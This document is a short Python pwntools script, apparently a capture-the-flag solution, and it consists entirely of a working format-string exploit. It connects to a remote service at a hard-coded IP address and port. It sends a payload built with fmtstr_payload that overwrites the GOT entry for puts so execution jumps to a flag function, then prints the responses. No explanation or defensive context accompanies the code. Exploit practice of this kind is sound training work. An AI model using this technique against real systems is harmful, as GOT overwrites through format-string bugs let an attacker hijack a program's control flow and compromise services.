from pwn import *

HOST = "178.216.122.15"
PORT = 43459

offset = 7
GOT_PUTS = 0x804c010
GOT_FLAG = 0x80491a6

context(arch='i386', os='linux')
p = remote(HOST, PORT)

p.recvuntil(b'Enter your name: ')
p.clean()
payload = fmtstr_payload(offset, {GOT_PUTS: GOT_FLAG})
p.sendline(payload)
print(p.recvline())
print(p.recvline())